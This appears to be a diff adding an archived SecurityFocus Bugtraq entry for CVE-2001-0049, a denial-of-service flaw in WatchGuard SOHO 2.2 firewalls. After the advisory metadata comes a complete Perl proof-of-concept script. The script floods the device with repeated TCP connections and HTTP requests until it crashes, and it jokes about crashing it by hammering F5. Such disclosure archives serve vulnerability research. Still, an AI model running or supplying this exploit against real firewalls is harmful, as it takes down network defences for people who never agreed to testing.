@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid2082<p><b><span style="font-size: 18pt;">Watchguard SOHO 2.2 Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2082/info">info</a><br><a href="http://www.securityfocus.com/bid/2082/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2082/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2082/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2082/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2082
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Failure to Handle Exceptional Conditions
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2001-0049<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 08 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 03:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was first reported to Bugtraq on December 8, 2000 by Filip Maertens &lt;filip@securax.be&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WatchGuard SOHO 2.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	#!/usr/bin/perl<br/> #<br/> # You can also connect to the Watchguard SOHO through your<br/> # browser and press F5 like a maniac on speed to get the<br/> # firewall crashing.  So, either you run the .pl script or<br/> # you fire up your webbrowser... Either way, it works.<br/> # ----------------------------------------------------------<br/> # Disclaimer: this file is intended as proof of concept, and<br/> # is not intended to be used for illegal purposes. I accept<br/> # no responsibility for damage incurred by the use of it.<br/> # ----------------------------------------------------------<br/> # (c)Proof of concept, vorlon &amp;lt;filip@securax.be&amp;gt;<br/> # ----------------------------------------------------------<br/> use IO::Socket;<br/><br/>  $host = "your_watchguard_ip";<br/>  $port = "your_port";<br/>  $repeat = "100";<br/>  $request = "GET / HTTP/1.0";<br/><br/>  print "Watchguard SOHO Denial of Service, connecting to $host:$port...\n";<br/>  $socket = IO::Socket::INET-&amp;gt;new(Proto=&amp;gt;"tcp", PeerAddr=&amp;gt;$host, PeerPort=&amp;gt;$port) ||<br/>die "Failed.\n";<br/><br/>   $counter = 0;<br/>   print "Repeating request for $repeat times.\n";<br/>    while($counter &amp;lt; $repeat) {<br/>          print $socket "$request\n";<br/>          $socket = IO::Socket::INET-&amp;gt;new(Proto=&amp;gt;"tcp", PeerAddr=&amp;gt;$host,<br/>PeerPort=&amp;gt;$port) || die "\nThe Watchguard SOHO has crashed.  BEEFCAKE!...\n";<br/>          print ".";<br/>          $counter += 1;<br/>    }<br/>   print "\nDone.\n\n";<br/><br/>   close($socket);
+	
+		<ul>
+</ul>
+</div>
